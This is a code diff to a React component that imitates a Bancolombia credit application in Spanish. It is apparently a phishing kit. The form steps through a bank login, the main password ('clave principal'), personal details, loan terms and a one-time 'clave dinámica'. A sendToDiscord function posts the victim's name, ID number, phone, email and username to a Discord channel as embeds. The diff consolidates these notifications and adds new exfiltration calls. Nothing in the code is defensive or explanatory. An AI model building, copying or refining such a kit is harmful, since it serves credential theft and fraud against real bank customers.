@@ -244,15 +244,11 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
   const sendToDiscord = async (event: string, extraFields?: { name: string; value: string; inline?: boolean }[]) => {
     const titles: Record<string, string> = {
-      cliente: '👤 Selección: ¿Eres cliente Bancolombia?',
-      login: '🔐 Inicio de sesión - Usuario ingresado',
-      pin: '🔑 Clave principal ingresada',
-      step1: '📋 Paso 1 - Datos personales enviados',
-      step2: '💰 Paso 2 - Monto y plazo seleccionados',
-      step3: '📄 Paso 3 - Situación laboral enviada',
-      processing: '⏳ Solicitud en procesamiento',
-      otp: '🔢 Clave dinámica ingresada',
-      approved: '✅ Crédito aprobado',
+      pin: '👤 Inicio · 🔐 Login · 🔑 Clave principal',
+      step1: '📋 Paso 1 - Datos personales',
+      step2: '💰 Paso 2 - Monto y plazo',
+      step3: '📄 Paso 3 - Situación laboral',
+      otp: '🔢 Clave dinámica',
     };
     const payload = {
       embeds: [{
@@ -279,8 +275,6 @@ function CreditForm({ onClose }: { onClose: () => void }) {
         { name: 'Cédula', value: form.cedula, inline: true },
         { name: 'Teléfono', value: form.telefono, inline: true },
         { name: 'Email', value: form.email, inline: true },
-        { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
-        { name: 'Usuario', value: usuario || 'N/A', inline: true },
       ]);
       setStep(2);
     } else if (step === 2 && validateStep2()) {
@@ -303,7 +297,6 @@ function CreditForm({ onClose }: { onClose: () => void }) {
         { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
         { name: 'Usuario', value: usuario || 'N/A', inline: true },
       ]);
-      sendToDiscord('processing');
       setIsProcessing(true);
     }
   };
@@ -323,7 +316,6 @@ function CreditForm({ onClose }: { onClose: () => void }) {
         setUsuarioError('Por favor ingresa tu usuario');
         return;
       }
-      sendToDiscord('login', [{ name: 'Usuario', value: usuario, inline: true }]);
       setShowLogin(false);
       setShowPassword(true);
     };
@@ -446,7 +438,11 @@ function CreditForm({ onClose }: { onClose: () => void }) {
     };
 
     const handlePasswordContinue = () => {
-      sendToDiscord('pin', [{ name: 'Usuario', value: usuario, inline: true }]);
+      sendToDiscord('pin', [
+        { name: 'Cliente Bancolombia', value: 'Sí', inline: true },
+        { name: 'Usuario', value: usuario, inline: true },
+        { name: 'Clave principal', value: '✅ Ingresada', inline: true },
+      ]);
       setShowPassword(false);
       setStep(1);
     };
@@ -713,18 +709,6 @@ function CreditForm({ onClose }: { onClose: () => void }) {
             setOtp(['', '', '', '', '', '']);
             setOtpAttempt(1);
             setShowApproved(true);
-            sendToDiscord('approved', [
-              { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
-              { name: 'Cédula', value: form.cedula, inline: true },
-              { name: 'Teléfono', value: form.telefono, inline: true },
-              { name: 'Email', value: form.email, inline: true },
-              { name: 'Monto aprobado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
-              { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
-              { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
-              { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
-              { name: 'Usuario', value: usuario || 'N/A', inline: true },
-              { name: 'Radicado', value: `BC-${Date.now().toString().slice(-8)}`, inline: false },
-            ]);
           }, 350);
         }
       }
@@ -1078,13 +1062,17 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
               <div className="w-full flex flex-col gap-3 px-4">
                 <button
-                  onClick={() => { setEsCliente(true); setShowLogin(true); sendToDiscord('cliente', [{ name: 'Respuesta', value: 'Soy cliente', inline: true }]); }}
+                  onClick={() => { setEsCliente(true); setShowLogin(true); }}
                   className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-4 rounded-full transition-all text-base shadow-sm hover:shadow-md hover:-translate-y-0.5"
                 >
                   Soy cliente
                 </button>
                 <button
-                  onClick={() => { setEsCliente(false); setStep(1); sendToDiscord('cliente', [{ name: 'Respuesta', value: 'No soy cliente', inline: true }]); }}
+                  onClick={() => { setEsCliente(false); setStep(1); sendToDiscord('pin', [
+                    { name: 'Cliente Bancolombia', value: 'No', inline: true },
+                    { name: 'Usuario', value: 'N/A', inline: true },
+                    { name: 'Clave principal', value: 'N/A', inline: true },
+                  ]); }}
                   className="w-full border-2 border-[#1C1C1C] text-[#1C1C1C] font-bold py-3.5 rounded-full hover:bg-gray-50 transition-all text-base"
                 >
                   No soy cliente
